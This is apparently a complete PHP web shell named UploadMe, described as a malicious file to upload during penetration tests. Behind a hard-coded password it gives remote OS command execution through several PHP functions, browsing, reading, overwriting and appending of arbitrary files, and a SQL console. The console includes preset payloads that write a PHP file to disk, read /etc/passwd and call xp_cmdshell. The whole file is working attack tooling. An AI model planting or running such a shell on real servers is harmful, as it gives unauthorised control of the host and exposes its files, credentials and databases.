<?php

$slash = "/";

function redirectTo($site){
		header("Location: ".$site);
		die();
}

function human_filesize($bytes, $decimals = 2) { //from: http://jeffreysambells.com/2012/10/25/human-readable-filesize-php
    $size = array('B','kB','MB','GB','TB','PB','EB','ZB','YB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}

function endsWith($haystack, $needle) { //from: http://stackoverflow.com/questions/834303/startswith-and-endswith-functions-in-php
    // search forward starting from end minus needle length characters
    return $needle === "" || (($temp = strlen($haystack) - strlen($needle)) >= 0 && strpos($haystack, $needle, $temp) !== false);
}

function readFileFrom($path){
	$myfile = fopen($path, "r") or $return = "Unable to open file to read!";
	$return .= fread($myfile,filesize($path));
	fclose($myfile);
	return $return;
}

function writeToFile($path, $content){
	$myfile = fopen($path, "w") or die("Unable to open file to write!");
	fwrite($myfile, $content);
	fclose($myfile);
}

function appendToFile($path, $content){
	$myfile = fopen($path, "a") or die("Unable to open file to append!");
	fwrite($myfile, $content);
	fclose($myfile);
}

function runCommand($command){
	if($output = system($command)){ return "\n\nsystem($command) was succesfull";}
	if($output = shell_exec($command)){ return $output."\n\nshell_exec($command) was succesfull";}
	if(exec($command, $output, $returncode) && $returncode == 0){ return implode("\n",$output)."\n\nexec($command) was succesfull";}
	if($output = `$command`){ return $output."\n\n`$command` was succesfull";}
	if($output = passthru($command, $returncode) || $returncode == 0){ return "\n\npassthru($command) was succesfull";}
	return "I was unable to run your command, sorry :/";
}

function sqlConnectAndQuery($servername, $username, $password, $dbname, $query){
	// Create connection
	$conn = new mysqli($servername, $username, $password, $dbname);
	// Check connection
	if ($conn->connect_error) {
		 return "Connection failed: " . $conn->connect_error;
	}
	if(!($result = $conn->query($query))){ return ("Query failed: " . $conn->error); }

	if ($result->num_rows > 0) {
		 // output data of each row
		 while($row = $result->fetch_array()) {
			for($i=0; $i<count($row); $i++)
		     {$return .= $row[$i]. " - ";}
			$return .= "\n";
		 }
	} else {
		 $return .= "0 results";
	}
	$conn->close();
	return $return;
}

function getPermissions($path) { //From: https://secure.php.net/manual/en/function.fileperms.php
  $perms = fileperms($path);

  switch ($perms & 0xF000) {
      case 0xC000: // socket
          $info = 's';
          break;
      case 0xA000: // symbolic link
          $info = 'l';
          break;
      case 0x8000: // regular
          $info = '-';
          break;
      case 0x6000: // block special
          $info = 'b';
          break;
      case 0x4000: // directory
          $info = 'd';
          break;
      case 0x2000: // character special
          $info = 'c';
          break;
      case 0x1000: // FIFO pipe
          $info = 'p';
          break;
      default: // unknown
          $info = 'u';
  }

  // Owner
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

  // Group
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

  // World
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

  return $info;
}

function getOwnerAndGroup($path){
  return posix_getpwuid(fileowner($path))['name']."\t".posix_getpwuid(filegroup($path))['name'];
}
?>

<!DOCTYPE html>
<html>
<head>
<style> <!-- From: http://www.w3schools.com/css/css_intro.asp -->
body {
    font: 100% Verdana;
    margin: 20px;
    line-height: 26px;
}

.container {
    xmin-width: 900px;
}

.wrapper {
    position: relative;
    overflow: auto;
}

#sidebar {
    background-color: #f1f1f1;
    border: 1px solid #d4d4d4;
    padding-left: 10px;
}

#bottom {
    text-align: center;
    padding: 10px;
    font-size: 70%;
    line-height: 14px;
}

h1, h2, h3 {
    color: #84c754;
}

#menulist {
    padding: 0;
    position: relative;
    overflow: auto;
}

.menuitem {
    width: 165px;
    float: left;
    background-color: #555555;
    color: #ffffff;
    list-style-type: none;
    margin: 4px;
    padding: 2px;
    text-align: center;
    cursor: pointer;
}

.menuitem a, .menuitem a:hover{
    color: #ffffff;
}

.menuitem:hover {
    background-color: #999999;
}

a {
    color: #000000;
}

a:hover {
    color: #84c754;
}
</style>
<title>UploadMe - Malicious file to be uploaded for pentest</title>
</head>
<body>
<div class="container wrapper">
  <div id="top">
    <h1>UploadMe</h1>
	<p>Malicious file to be uploaded for pentest</p>
  </div>
  <div class="wrapper">
    <div id="menubar">
	  <ul id="menulist">
		<li class="menuitem"><a href="?site=filebrowser&password=<?php echo $_GET["password"]."&path=". substr($_GET["path"],0,strrpos($_GET["path"],$slash)); ?>">File browser</a>
		<li class="menuitem"><a href="?site=filereader&password=<?php echo $_GET["password"]."&path=".$_GET["path"]; ?>">File reader</a>
		<li class="menuitem"><a href="?site=fileeditor&password=<?php echo $_GET["password"]."&path=".$_GET["path"]; ?>">File editor</a>
		<li class="menuitem"><a href="?site=fileappender&password=<?php echo $_GET["password"]."&path=".$_GET["path"]; ?>">File appender</a>
		<li class="menuitem"><a href="?site=runcommand&password=<?php echo $_GET["password"]; ?>">Run OS command</a>
		<li class="menuitem"><a href="?site=sql&password=<?php echo $_GET["password"]; ?>">SQL</a>
	  </ul>
    </div>
    <div id="main">
<?php

//LOGIN

if(!isset($_GET["password"]) || $_GET["password"] != "futureofeurope"){
	echo "<form method=\"get\" action=\"\"><p>Please login</p><p><input type=\"password\" name=\"password\" value=\"\"></p><p><input type=\"submit\" value=\"Login\"></p></form>";
}

//RUN COMMAND

elseif(isset($_GET["site"]) && $_GET["site"] == "runcommand"){
	echo "<form method=\"get\" action=\"\"><input type=\"hidden\" name=\"password\" value=\"".$_GET["password"]."\"><input type=\"hidden\" name=\"site\" value=\"".$_GET["site"]."\"><input type=\"text\" name=\"command\" value=\"".$_GET["command"]."\"><input type=\"submit\" value=\"Execute!\"></form>";
	if(isset($_GET["command"])){ echo "<div id=\"sidebar\"><pre>"; echo runCommand($_GET["command"]); echo "</pre></div>";}
}

//SQL

elseif(isset($_GET["site"]) && $_GET["site"] == "sql"){
	echo "<form method=\"get\" action=\"\"><input type=\"hidden\" name=\"password\" value=\"".$_GET["password"]."\"><input type=\"hidden\" name=\"site\" value=\"".$_GET["site"]."\"><table><tr><td>Server name (localhost): </td><td><input type=\"text\" name=\"sqlservername\" value=\"".$_GET["sqlservername"]."\"></td></tr><tr><td>SQL username: </td><td><input type=\"text\" name=\"sqlusername\" value=\"".$_GET["sqlusername"]."\"></td></tr><tr><td>SQL password: </td><td><input type=\"text\" name=\"sqlpassword\" value=\"".$_GET["sqlpassword"]."\"></td></tr><tr><td>Database name: </td><td><input type=\"text\" name=\"sqldbname\" value=\"".$_GET["sqldbname"]."\"></td></tr><tr><td>SQL query: </td><td><input type=\"text\" id=\"sqlquery\" name=\"sqlquery\" style=\"width:300%\" value=\"".$_GET["sqlquery"]."\"><br>
<a href=\"#\" onclick=\"document.getElementById('sqlquery').value='SELECT * FROM information_schema.tables'\">[List all db &amp; table]</a>
<a href=\"#\" onclick=\"document.getElementById('sqlquery').value='SELECT \\'<?php phpinfo(); ?>\\' INTO OUTFILE \\'/tmp/phpinfo.php\\' '\">[Write to file (MySQL)]</a>
<a href=\"#\" onclick=\"document.getElementById('sqlquery').value='SELECT LOAD_FILE(\\'/etc/passwd\\')'\">[Read from file(MySQL)]</a>
<a href=\"#\" onclick=\"document.getElementById('sqlquery').value='EXECUTE [master].[dbo].[xp_cmdshell] \\'dir C:\\\\Scripts\\\\*.sql\\''\">[Execute OS command (MS SQL) - untested]</a>
</td></tr><tr><td></td><td><input type=\"submit\" value=\"Execute!\"></td></tr></table></form>";
	if(isset($_GET["sqlquery"])){ echo "<div id=\"sidebar\"><pre>"; echo sqlConnectAndQuery($_GET["sqlservername"],$_GET["sqlusername"],$_GET["sqlpassword"],$_GET["sqldbname"],$_GET["sqlquery"]); echo "</pre></div>";}
}

//FILE OPERATIONS

elseif(isset($_GET["site"])){
		echo "<h2>".$path."</h2>\n<form method=\"get\" action=\"\"><input type=\"hidden\" name=\"password\" value=\"".$_GET["password"]."\"><input type=\"hidden\" name=\"site\" value=\"".$_GET["site"]."\"><input type=\"text\" name=\"path\" value=\"".$_GET["path"]."\"><input type=\"submit\" value=\"Go!\"></form>";

		//FILE BROWSER

	if($_GET["site"] == "filebrowser"){
		echo "\n<table>\n";
		$path = ".";
		if(isset($_GET["path"]) && $_GET["path"] != "") $path = $_GET["path"];
		if($files = scandir($path)) {
		$oddrow = True;
		foreach($files as $entry) {
				$abspath = $path.$slash.$entry;
				if($entry == ".") $abspath = $path;
				if($entry == ".." && !endsWith($path,"..") && $path != ".") $abspath = substr($path,0,strrpos($path,$slash));
				if($oddrow) echo "<tr style='background-color:lightgray'>";
				else echo "<tr>";
				$oddrow = !$oddrow; 
				if(is_link($abspath)){
				echo "<td colspan=\"5\"><a href=\"?site=filebrowser&path=".$abspath."&password=".$_GET["password"]."\">[LINK]$entry ->".readlink($abspath)."</a></td>";
				}elseif(is_dir($abspath)){
				echo "<td colspan=\"5\"><a href=\"?site=filebrowser&path=".$abspath."&password=".$_GET["password"]."\">[DIR]$entry</a></td>";
				}elseif(is_file($abspath)){
		      echo "<td><a href=\"?site=filereader&path=".$abspath."&password=".$_GET["password"]."\">$entry</a></td><td>".human_filesize(filesize($abspath))."</td><td>".date("F d Y H:i:s.", filemtime($abspath))."</td><td><a href=\"?site=fileeditor&path=".$abspath."&password=".$_GET["password"]."\">[Edit]</a></td><td><a href=\"?site=fileappender&path=".$abspath."&password=".$_GET["password"]."\">[Append]</a></td>";
				}else{
				echo "<td colspan=\"5\"><a href=\"?site=filebrowser&path=".$abspath."&password=".$_GET["password"]."\">[???]$entry</a></td>";
				}
				echo "<td>".getPermissions($abspath)."</td><td>".getOwnerAndGroup($abspath)."</td></tr>\n";
		}
		closedir($handle);
		echo "\n</table>\n";
	   }else{ redirectTo("?site=filereader&path=".$path."&password=".$_GET["password"]);}
	}

	//FILE READER

	elseif($_GET["site"] == "filereader"){
		if($_GET["path"] == "" || is_dir($_GET["path"])){ redirectTo("?site=filebrowser&path=".$_GET["path"]."&password=".$_GET["password"]);}
		$filecontent = readFileFrom($_GET["path"]);
		echo "<div><textarea rows=\"". substr_count($filecontent,"\n")*1.5 ."\" cols=\"150\">".$filecontent."</textarea></div>";
	}

	//FILE EDITOR

	elseif($_GET["site"] == "fileeditor"){
		if($_GET["path"] == "" || is_dir($_GET["path"])){ redirectTo("?site=filebrowser&path=".$_GET["path"]."&password=".$_GET["password"]);}
		if($_GET["filecontent"]){ writeToFile($_GET["path"], $_GET["filecontent"]); }
		$filecontent = readFileFrom($_GET["path"]);
		echo "<form method=\"get\" action=\"\"><p>This will overwrite the existing file. Permissions on the file might change.</p><p><input type=\"hidden\" name=\"password\" value=\"".$_GET["password"]."\"><input type=\"hidden\" name=\"site\" value=\"".$_GET["site"]."\"><input type=\"text\" name=\"path\" value=\"".$_GET["path"]."\"></p><p><input type=\"submit\" name=\"submit\" value=\"Write it!\"></p><div>\n<textarea name=\"filecontent\" rows=\"". substr_count($filecontent,"\n")*1.5 ."\" cols=\"150\">".$filecontent."</textarea></form>\n</div>";
	}

	//FILE APPENDER
	elseif($_GET["site"] == "fileappender"){
		if($_GET["path"] == "" || is_dir($_GET["path"])){ redirectTo("?site=filebrowser&path=".$_GET["path"]."&password=".$_GET["password"]);}
		if($_GET["filecontent"]){ appendToFile($_GET["path"], $_GET["filecontent"]); }
		$filecontent = readFileFrom($_GET["path"]);
		echo "<form method=\"get\" action=\"\"><p>This will overwrite the existing file. Permissions on the file might change.</p><p><input type=\"hidden\" name=\"password\" value=\"".$_GET["password"]."\"><input type=\"hidden\" name=\"site\" value=\"".$_GET["site"]."\"><input type=\"text\" name=\"path\" value=\"".$_GET["path"]."\"></p><p><input type=\"submit\" name=\"submit\" value=\"Append it!\"></p><div>\n<textarea disabled rows=\"". substr_count($filecontent,"\n")*1.5 ."\" cols=\"150\">".$filecontent."</textarea>\n<textarea name=\"filecontent\" rows=\"30\" cols=\"150\"></textarea></form>\n</div>";
	}

}//end of if(isset($_GET["site"]))
?>
  </div>  
  <div id="bottom">
	&copy; <a href="http://github.com/markszabo/" target="_blank">markszabo</a>
  </div>
</div>
</div>

</body>
</html>
